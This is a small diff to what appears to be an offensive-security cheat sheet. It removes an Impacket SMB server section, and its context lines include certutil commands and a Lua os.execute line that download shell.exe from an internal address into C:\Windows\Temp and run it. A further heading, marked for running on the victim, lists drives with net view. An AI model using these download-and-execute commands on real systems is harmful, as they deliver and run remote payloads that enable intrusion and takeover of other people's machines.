@@ -188,11 +188,6 @@ certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
 os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
 ```
 
-# Start Impacket SMB Server (With SMB2 Support)
-```bash
-impacket-smbserver -smb2support server_name /var/www/html
-```
-
 # SMB List Drives (Execute on Victim)
 ```
 net view \\192.168.0.1
